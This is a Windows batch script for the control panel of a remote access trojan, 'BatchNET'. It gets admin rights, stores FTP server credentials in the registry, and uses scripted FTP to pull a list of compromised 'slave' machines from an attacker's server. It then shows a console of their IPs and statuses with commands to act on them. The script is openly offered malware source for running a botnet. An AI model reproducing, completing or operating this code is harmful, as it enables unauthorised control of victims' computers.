REM Control Panel made by Quantum Batch
REM Client RAT made by 0x0f
@ECHO OFF
SETLOCAL ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
GOTO GET_ADMIN

:GOT_ADMIN
IF EXIST "%TEMP%\GETADMIN.VBS" ( 
	DEL "%TEMP%\GETADMIN.VBS" 
)
IF EXIST "%TEMP%\AdminTest" (
	RD /S /Q "%TEMP%\AdminTest" >NUL
)
TITLE BatchNET ^| Made by Quantum Batch ^& 0x0F
MODE CON LINES=50 COLS=100
COLOR 1F
REG QUERY HKLM\SOFTWARE\BatchNET || GOTO NEW_USER >NUL
CLS
GOTO LOAD_SETTINGS
:NEW_USER
SET LEVEL=0
SET CHAR_MAX=45
:MAKE_SETTINGS
SET /A LEVEL+=1
:EMPTY_RESPONSE
CLS
IF NOT DEFINED SERVER_PASS_SPACE SET "SERVER_PASS=                                             " & SET LEVEL=3
IF NOT DEFINED SERVER_USER_SPACE SET "SERVER_USER=                                             " & SET LEVEL=2
IF NOT DEFINED SERVER_ADDRESS_SPACE SET "SERVER_ADDRESS=                                             " & SET LEVEL=1
ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
ECHO บ                                       BatchNET ^| Setup Page                                     บ
ECHO วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
ECHO บ                                                                                          (B)ack บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                           FTP Server Address                                                    บ
ECHO บ                           ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       บ
ECHO บ                           ณ!SERVER_ADDRESS!ณ                       บ
ECHO บ                           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู                       บ
ECHO บ                                                                                                 บ
ECHO บ                           FTP Server Username                                                   บ
ECHO บ                           ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       บ
ECHO บ                           ณ!SERVER_USER!ณ                       บ
ECHO บ                           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู                       บ
ECHO บ                                                                                                 บ
ECHO บ                           FTP Server Password                                                   บ
ECHO บ                           ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       บ
ECHO บ                           ณ!SERVER_PASS!ณ                       บ
ECHO บ                           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู                       บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
IF %LEVEL% EQU 1 (
	SET /P "SERVER_ADDRESS=Server Address: "
	SET SERVER_ADDRESS=!SERVER_ADDRESS:^&=!
	SET SERVER_ADDRESS=!SERVER_ADDRESS:^|=!
	IF /I "!SERVER_ADDRESS!" EQU "B" (
		SET SERVER_ADDRESS=
		GOTO EMPTY_RESPONSE
	)
	SET INPUT=SERVER_ADDRESS
	SET "INPUT2=!SERVER_ADDRESS!"
	SET TYPE=SERVER_ADDRESS_SPACE
	SET VAR_CLEAR=SERVER_ADDRESS
)
IF %LEVEL% EQU 2 (
	SET /P "SERVER_USER=Server Username: "
	SET SERVER_USER=!SERVER_USER:^&=!
	SET SERVER_USER=!SERVER_USER:^|=!
	IF /I "!SERVER_USER!" EQU "B" (
		SET SERVER_USER=
		SET SERVER_ADDRESS_SPACE=
		SET LEVEL=1
		GOTO EMPTY_RESPONSE 
	)
	SET INPUT=SERVER_USER
	SET "INPUT2=!SERVER_USER!"
	SET TYPE=SERVER_USER_SPACE
	SET VAR_CLEAR=SERVER_USER
)
IF %LEVEL% EQU 3 (
	SET /P "SERVER_PASS=Server Password: "
	SET SERVER_PASS=!SERVER_PASS:^&=!
	SET SERVER_PASS=!SERVER_PASS:^|=!
	IF /I "!SERVER_PASS!" EQU "B" (
		SET SERVER_PASS=
		SET SERVER_USER_SPACE=
		SET LEVEL=2
		GOTO EMPTY_RESPONSE 
	)
	SET INPUT=SERVER_PASS
	SET "INPUT2=!SERVER_PASS!"
	SET TYPE=SERVER_PASS_SPACE
	SET VAR_CLEAR=SERVER_PASS
)
IF %LEVEL% EQU 4 (
	SET /P "CONFIRM=Are These Credentials Correct?(Y/N) "
	SET CONFIRM=!CONFIRM:^&=!
	SET CONFIRM=!CONFIRM:^|=!
	IF /I "!CONFIRM!" EQU "y" GOTO REGISTER_CREDENTIALS
	IF /I "!CONFIRM!" EQU "n" (
		SET LEVEL=0
		SET SERVER_ADDRESS_SPACE=
		SET SERVER_USER_SPACE=
		SET SERVER_PASS_SPACE=
		SET SERVER_SCRNNME_SPACE=
		GOTO MAKE_SETTINGS
	)
	IF /I "!CONFIRM!" EQU "B" (
		SET CONFIRM=
		SET SERVER_SCRNNME_SPACE=
		SET LEVEL=3
		GOTO EMPTY_RESPONSE 
	)
)
CLS
CALL :SPACE_COUNTER
SET SPACES=
GOTO MAKE_SETTINGS
:REGISTER_CREDENTIALS
SET SERVER_PASS=%SERVER_PASS: =%
SET SERVER_ADDRESS=%SERVER_ADDRESS: =%
SET SERVER_USER=%SERVER_USER: =%
ECHO 0 >SLAVES.DAT
(
	ECHO USER !SERVER_USER!
	ECHO !SERVER_PASS!
	ECHO BINARY
	ECHO PUT SLAVES.DAT
	ECHO QUIT
)>BatchNET_Server.BLD
FTP -n -s:BatchNET_Server.BLD !SERVER_ADDRESS!
CD "%TEMP%"
CALL :HASH_ENCRYPT !SERVER_PASS! SERVER_PASS
(
	ECHO Windows Registry Editor Version 5.00
	ECHO.
	ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\BatchNET\Account]
	ECHO "Address"="!SERVER_ADDRESS!"
	ECHO "Username"="!SERVER_USER!"
	ECHO "Password"="!SERVER_PASS!"
)>"BatchNET.REG"
REGEDIT /S "BatchNET.REG"
MSG * The username and password for the server will be the same as the username and password used for login.
DEL BatchNET.REG
:LOAD_SETTINGS
FOR /F "tokens=3* delims=	 " %%C IN ('REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\BatchNET\Account" /v Username') DO SET USER=%%C
FOR /F "tokens=3* delims=	 " %%C IN ('REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\BatchNET\Account" /v Password') DO SET PASS=%%C
FOR /F "tokens=3* delims=	 " %%C IN ('REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\BatchNET\Account" /v Address') DO SET HOST_SERVER=%%C
SET LEVEL=0
SET CHAR_MAX=45
:LOGIN_PAGE
SET /A LEVEL+=1
:LOGIN_RESPONSE
CLS
IF NOT DEFINED LOGIN_PASSWORD_SPACE SET "LOGIN_PASSWORD=                                             " & SET LEVEL=2
IF NOT DEFINED LOGIN_USERNAME_SPACE SET "LOGIN_USERNAME=                                             " & SET LEVEL=1
ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
ECHO บ                                       BatchNET ^| Login Page                                     บ
ECHO วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
ECHO บ                                                                                          (B)ack บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                           Username                                                              บ
ECHO บ                           ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       บ
ECHO บ                           ณ!LOGIN_USERNAME!ณ                       บ
ECHO บ                           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู                       บ
ECHO บ                           Password                                                              บ
ECHO บ                           ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       บ
ECHO บ                           ณ!LOGIN_PASSWORD!ณ                       บ
ECHO บ                           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู                       บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO บ                                                                                                 บ
ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
IF %LEVEL% EQU 1 (
	SET /P "USERNME=Username: "
	SET USERNME=!USERNME:^&=!
	SET USERNME=!USERNME:^|=!
	IF /I "!USERNME!" EQU "B" (
		SET USERNME=
		GOTO LOGIN_RESPONSE
	)
	SET INPUT=LOGIN_USERNAME
	SET "INPUT2=!USERNME!"
	SET TYPE=LOGIN_USERNAME_SPACE
	SET VAR_CLEAR=USERNME
)
IF %LEVEL% EQU 2 (
	SET /P "PASSWORD=Password: "
	SET PASSWORD=!PASSWORD:^&=!
	SET PASSWORD=!PASSWORD:^|=!
	IF /I "!PASSWORD!" EQU "B" (
		SET PASSWORD=
		SET LOGIN_USERNAME_SPACE=
		SET LEVEL=1
		GOTO LOGIN_RESPONSE 
	)
	SET INPUT=LOGIN_PASSWORD
	SET "INPUT2=!PASSWORD!"
	SET TYPE=LOGIN_PASSWORD_SPACE
	SET VAR_CLEAR=PASSWORD
)
IF %LEVEL% EQU 3 (
	CALL :HASH_ENCRYPT !PASSWORD! NEW_PASS_HASH
	IF "!USERNME!" EQU "!USER!" (
		IF !NEW_PASS_HASH! EQU !PASS! (
			GOTO RAT_MAIN_LOAD
		) ELSE (
			MSG * Username and/or Password Incorrect.
			SET LOGIN_PASSWORD_SPACE=
			SET LOGIN_USERNAME_SPACE=
			SET LEVEL=1
			GOTO LOGIN_RESPONSE
		)
	) ELSE (
		MSG * Username and/or Password Incorrect.
		SET LOGIN_PASSWORD_SPACE=
		SET LOGIN_USERNAME_SPACE=
		SET LEVEL=1
		GOTO LOGIN_RESPONSE
	)
	
)
CLS
CALL :SPACE_COUNTER
SET SPACES=
GOTO LOGIN_PAGE

:RAT_MAIN_LOAD
CLS
CD %TEMP%
DEL SLAVES.DAT 2>NUL
DEL UPDATE.DAT 2>NUL
DEL STATUS_CHECK.CHK 2>NUL
DEL STATUS_CHECK2.CHK 2>NUL
DEL CHECK.CHK 2>NUL
ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
ECHO บ                                         BatchNET Console                                        บ
ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
SET /P ".=Updating slave list..." <NUL
(
	ECHO USER !USERNME!
	ECHO !PASSWORD!
	ECHO BINARY
	ECHO GET SLAVES.DAT
	ECHO QUIT
)>UPDATE.DAT
FTP -n -s:UPDATE.DAT !HOST_SERVER! >NUL
SET /P NUMBER_OF_SLAVES=<SLAVES.DAT
SET NUMBER_OF_SLAVES=!NUMBER_OF_SLAVES: =!
IF !NUMBER_OF_SLAVES! EQU 0 (
	ECHO ERROR
	ECHO  - You currently have no slaves. Program will now exit.
	ECHO.
	PAUSE
	EXIT
)
ECHO DONE
ECHO.
SET /P ".=Checking status of each slave..." <NUL
SET COUNT=1
SET CHAR_MAX=17

SET SKIP_LINE=1
FOR /F %%E IN (SLAVES.DAT) DO (
	IF !SKIP_LINE! EQU 2 (
		CLS
		ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
		ECHO บ                                         BatchNET Console                                        บ
		ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
		ECHO Updating slave list...DONE
		ECHO.
		SET /P ".=Checking status of each slave..." <NUL
		ECHO !COUNT!/!NUMBER_OF_SLAVES!
		CALL :CHECK_STATUS %%E !COUNT!
		REM AFTER IT FINDS THE NAME OF THE SLAVE UNDER SLAVES.DAT, IT WILL INSPECT THE FOLDER OF THE SLAVE AND RETRIEVE ITS INFO SUCH AS ITS NICKNAME ETC.
		SET INPUT2=%%E
		SET INPUT=SLAVE_!COUNT!
		CALL :SPACE_COUNTER
		SET /A COUNT+=1
		SET SKIP_LINE=1
	)
	SET /A SKIP_LINE+=1
)
CLS
ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
ECHO บ                                         BatchNET Console                                        บ
ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
ECHO Updating slave list...DONE
ECHO.
ECHO Checking status of each slave...DONE
ECHO.
PAUSE
:RAT_MAIN
CLS
ECHO ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
ECHO บ                                        BatchNET ^| Main Page                                     บ
ECHO วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤยฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
ECHO บ          Slave's I.P.      Status               ณ          Slave's I.P.      Status             บ
ECHO วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤลฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
IF DEFINED SLAVE_1 (
	IF DEFINED SLAVE_19 (
		SET /P ".=บ      (1) !SLAVE_1! " <nul
		CALL :COLORTEXT !COLOR_1! !STATUS_1!
		SET /P ".=.!EXTR_SPACE_1!             ณ     (19) !SLAVE_19! " <NUL
		CALL :COLORTEXT !COLOR_19! !STATUS_19!
		ECHO .           !EXTR_SPACE_19!บ
	) ELSE (
		SET /P ".=บ      (1) !SLAVE_1! " <nul
		CALL :COLORTEXT !COLOR_1! !STATUS_1!
		ECHO .             !EXTR_SPACE_1!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_2 (
	IF DEFINED SLAVE_20 (
		SET /P ".=บ      (2) !SLAVE_2! " <nul
		CALL :COLORTEXT !COLOR_2! !STATUS_2!
		SET /P ".=.!EXTR_SPACE_2!             ณ     (20) !SLAVE_20! " <NUL
		CALL :COLORTEXT !COLOR_20! !STATUS_20!
		ECHO .           !EXTR_SPACE_20!บ
	) ELSE (
		SET /P ".=บ      (2) !SLAVE_2! " <nul
		CALL :COLORTEXT !COLOR_2! !STATUS_2!
		ECHO .             !EXTR_SPACE_2!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_3 (
	IF DEFINED SLAVE_21 (
		SET /P ".=บ      (3) !SLAVE_3! " <nul
		CALL :COLORTEXT !COLOR_3! !STATUS_3!
		SET /P ".=.!EXTR_SPACE_3!             ณ     (21) !SLAVE_21! " <NUL
		CALL :COLORTEXT !COLOR_21! !STATUS_21!
		ECHO .           !EXTR_SPACE_21!บ
	) ELSE (
		SET /P ".=บ      (3) !SLAVE_3! " <nul
		CALL :COLORTEXT !COLOR_3! !STATUS_3!
		ECHO .             !EXTR_SPACE_3!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_4 (
	IF DEFINED SLAVE_22 (
		SET /P ".=บ      (4) !SLAVE_4! " <nul
		CALL :COLORTEXT !COLOR_4! !STATUS_4!
		SET /P ".=.!EXTR_SPACE_4!             ณ     (22) !SLAVE_22! " <NUL
		CALL :COLORTEXT !COLOR_22! !STATUS_22!
		ECHO .           !EXTR_SPACE_22!บ
	) ELSE (
		SET /P ".=บ      (4) !SLAVE_4! " <nul
		CALL :COLORTEXT !COLOR_4! !STATUS_4!
		ECHO .             !EXTR_SPACE_4!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_5 (
	IF DEFINED SLAVE_23 (
		SET /P ".=บ      (5) !SLAVE_5! " <nul
		CALL :COLORTEXT !COLOR_5! !STATUS_5!
		SET /P ".=.!EXTR_SPACE_5!             ณ     (23) !SLAVE_23! " <NUL
		CALL :COLORTEXT !COLOR_23! !STATUS_23!
		ECHO .           !EXTR_SPACE_23!บ
	) ELSE (
		SET /P ".=บ      (5) !SLAVE_5! " <nul
		CALL :COLORTEXT !COLOR_5! !STATUS_5!
		ECHO .             !EXTR_SPACE_5!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_6 (
	IF DEFINED SLAVE_24 (
		SET /P ".=บ      (6) !SLAVE_6! " <nul
		CALL :COLORTEXT !COLOR_6! !STATUS_6!
		SET /P ".=.!EXTR_SPACE_6!             ณ     (24) !SLAVE_24! " <NUL
		CALL :COLORTEXT !COLOR_24! !STATUS_24!
		ECHO .           !EXTR_SPACE_24!บ
	) ELSE (
		SET /P ".=บ      (6) !SLAVE_6! " <nul
		CALL :COLORTEXT !COLOR_6! !STATUS_6!
		ECHO .             !EXTR_SPACE_6!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_7 (
	IF DEFINED SLAVE_25 (
		SET /P ".=บ      (7) !SLAVE_7! " <nul
		CALL :COLORTEXT !COLOR_7! !STATUS_7!
		SET /P ".=.!EXTR_SPACE_7!             ณ     (25) !SLAVE_25! " <NUL
		CALL :COLORTEXT !COLOR_25! !STATUS_25!
		ECHO .           !EXTR_SPACE_25!บ
	) ELSE (
		SET /P ".=บ      (7) !SLAVE_7! " <nul
		CALL :COLORTEXT !COLOR_7! !STATUS_7!
		ECHO .             !EXTR_SPACE_7!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_8 (
	IF DEFINED SLAVE_26 (
		SET /P ".=บ      (8) !SLAVE_8! " <nul
		CALL :COLORTEXT !COLOR_8! !STATUS_8!
		SET /P ".=.!EXTR_SPACE_8!             ณ     (26) !SLAVE_26! " <NUL
		CALL :COLORTEXT !COLOR_26! !STATUS_26!
		ECHO .           !EXTR_SPACE_26!บ
	) ELSE (
		SET /P ".=บ      (8) !SLAVE_8! " <nul
		CALL :COLORTEXT !COLOR_8! !STATUS_8!
		ECHO .             !EXTR_SPACE_8!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_9 (
	IF DEFINED SLAVE_27 (
		SET /P ".=บ      (9) !SLAVE_9! " <nul
		CALL :COLORTEXT !COLOR_9! !STATUS_9!
		SET /P ".=.!EXTR_SPACE_9!             ณ     (27) !SLAVE_27! " <NUL
		CALL :COLORTEXT !COLOR_27! !STATUS_27!
		ECHO .           !EXTR_SPACE_27!บ
	) ELSE (
		SET /P ".=บ      (9) !SLAVE_9! " <nul
		CALL :COLORTEXT !COLOR_9! !STATUS_9!
		ECHO .             !EXTR_SPACE_9!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_10 (
	IF DEFINED SLAVE_28 (
		SET /P ".=บ     (10) !SLAVE_10! " <nul
		CALL :COLORTEXT !COLOR_10! !STATUS_10!
		SET /P ".=.!EXTR_SPACE_10!             ณ     (28) !SLAVE_28! " <NUL
		CALL :COLORTEXT !COLOR_28! !STATUS_28!
		ECHO .           !EXTR_SPACE_28!บ
	) ELSE (
		SET /P ".=บ     (10) !SLAVE_10! " <nul
		CALL :COLORTEXT !COLOR_10! !STATUS_10!
		ECHO .             !EXTR_SPACE_10!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_11 (
	IF DEFINED SLAVE_29 (
		SET /P ".=บ     (11) !SLAVE_11! " <nul
		CALL :COLORTEXT !COLOR_11! !STATUS_11!
		SET /P ".=.!EXTR_SPACE_11!             ณ     (29) !SLAVE_29! " <NUL
		CALL :COLORTEXT !COLOR_29! !STATUS_29!
		ECHO .           !EXTR_SPACE_29!บ
	) ELSE (
		SET /P ".=บ     (11) !SLAVE_11! " <nul
		CALL :COLORTEXT !COLOR_11! !STATUS_11!
		ECHO .             !EXTR_SPACE_11!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_12 (
	IF DEFINED SLAVE_30 (
		SET /P ".=บ     (12) !SLAVE_12! " <nul
		CALL :COLORTEXT !COLOR_12! !STATUS_12!
		SET /P ".=.!EXTR_SPACE_12!             ณ     (30) !SLAVE_30! " <NUL
		CALL :COLORTEXT !COLOR_30! !STATUS_30!
		ECHO .           !EXTR_SPACE_30!บ
	) ELSE (
		SET /P ".=บ     (12) !SLAVE_12! " <nul
		CALL :COLORTEXT !COLOR_12! !STATUS_12!
		ECHO .             !EXTR_SPACE_12!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_13 (
	IF DEFINED SLAVE_31 (
		SET /P ".=บ     (13) !SLAVE_13! " <nul
		CALL :COLORTEXT !COLOR_13! !STATUS_13!
		SET /P ".=.!EXTR_SPACE_13!             ณ     (31) !SLAVE_31! " <NUL
		CALL :COLORTEXT !COLOR_31! !STATUS_31!
		ECHO .           !EXTR_SPACE_31!บ
	) ELSE (
		SET /P ".=บ     (13) !SLAVE_13! " <nul
		CALL :COLORTEXT !COLOR_13! !STATUS_13!
		ECHO .             !EXTR_SPACE_13!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_14 (
	IF DEFINED SLAVE_32 (
		SET /P ".=บ     (14) !SLAVE_14! " <nul
		CALL :COLORTEXT !COLOR_14! !STATUS_14!
		SET /P ".=.!EXTR_SPACE_14!             ณ     (32) !SLAVE_32! " <NUL
		CALL :COLORTEXT !COLOR_32! !STATUS_32!
		ECHO .           !EXTR_SPACE_32!บ
	) ELSE (
		SET /P ".=บ     (14) !SLAVE_14! " <nul
		CALL :COLORTEXT !COLOR_14! !STATUS_14!
		ECHO .             !EXTR_SPACE_14!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_15 (
	IF DEFINED SLAVE_33 (
		SET /P ".=บ     (15) !SLAVE_15! " <nul
		CALL :COLORTEXT !COLOR_15! !STATUS_15!
		SET /P ".=.!EXTR_SPACE_15!             ณ     (33) !SLAVE_33! " <NUL
		CALL :COLORTEXT !COLOR_33! !STATUS_33!
		ECHO .           !EXTR_SPACE_33!บ
	) ELSE (
		SET /P ".=บ     (15) !SLAVE_15! " <nul
		CALL :COLORTEXT !COLOR_15! !STATUS_15!
		ECHO .             !EXTR_SPACE_15!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_16 (
	IF DEFINED SLAVE_34 (
		SET /P ".=บ     (16) !SLAVE_16! " <nul
		CALL :COLORTEXT !COLOR_16! !STATUS_16!
		SET /P ".=.!EXTR_SPACE_16!             ณ     (34) !SLAVE_34! " <NUL
		CALL :COLORTEXT !COLOR_34! !STATUS_34!
		ECHO .           !EXTR_SPACE_34!บ
	) ELSE (
		SET /P ".=บ     (16) !SLAVE_16! " <nul
		CALL :COLORTEXT !COLOR_16! !STATUS_16!
		ECHO .             !EXTR_SPACE_16!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_17 (
	IF DEFINED SLAVE_35 (
		SET /P ".=บ     (17) !SLAVE_17! " <nul
		CALL :COLORTEXT !COLOR_17! !STATUS_17!
		SET /P ".=.!EXTR_SPACE_17!             ณ     (35) !SLAVE_35! " <NUL
		CALL :COLORTEXT !COLOR_35! !STATUS_35!
		ECHO .           !EXTR_SPACE_35!บ
	) ELSE (
		SET /P ".=บ     (17) !SLAVE_17! " <nul
		CALL :COLORTEXT !COLOR_17! !STATUS_17!
		ECHO .             !EXTR_SPACE_17!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO บ                                                 ณ                                               บ
IF DEFINED SLAVE_18 (
	IF DEFINED SLAVE_36 (
		SET /P ".=บ     (18) !SLAVE_18! " <nul
		CALL :COLORTEXT !COLOR_18! !STATUS_18!
		SET /P ".=.!EXTR_SPACE_18!             ณ     (36) !SLAVE_36! " <NUL
		CALL :COLORTEXT !COLOR_36! !STATUS_36!
		ECHO .           !EXTR_SPACE_36!บ
	) ELSE (
		SET /P ".=บ     (18) !SLAVE_18! " <nul
		CALL :COLORTEXT !COLOR_18! !STATUS_18!
		ECHO .             !EXTR_SPACE_18!ณ                                               บ
	) 
) ELSE (
	ECHO บ                                                 ณ                                               บ
)
ECHO วฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ
ECHO บ                                        Commands ^| Tools                                         บ
ECHO บ -exit - Exit BatchNET                                                                           บ
ECHO บ -help [command] - Use this to get more help about a specific command                            บ
ECHO บ -more - Show a list of commands                                                                 บ
ECHO บ -all - Use this instead of [Number of the slave] to do to all slaves. Cannot be used for info   บ
ECHO บ -refresh - Refreshes the current status of all the slaves                                       บ
ECHO บ -info [Number of the slave] - Provides Info about the slave                                     บ
ECHO ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ
REM DEL SERVER COMMAND
